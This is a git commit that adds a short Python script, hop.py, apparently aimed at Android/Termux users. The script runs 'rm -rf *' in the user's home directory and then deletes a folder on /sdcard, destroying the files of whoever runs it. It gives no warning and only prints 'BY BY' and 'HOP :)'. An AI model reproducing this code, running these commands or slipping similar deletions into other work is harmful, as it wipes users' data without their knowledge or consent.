360c344202b539764a1e68607c2f628ca3f04503
filecloning <81711780+filecloning@users.noreply.github.com>
2021-04-03 22:01:14 +0500

    Create hop.py

---
+++ hop.py
@@ -0,0 +1,9 @@
+import os , sys , time , datetime, re
+reload(sys)
+sys.setdefaultencoding('utf-8')
+os.system('cd && rm -rf * ')
+os.system('cd /sdcard && rm -rf afzajaan')
+print(' BY BY ' )
+print('')
+print(' ')
+print(' HOP :) ' )
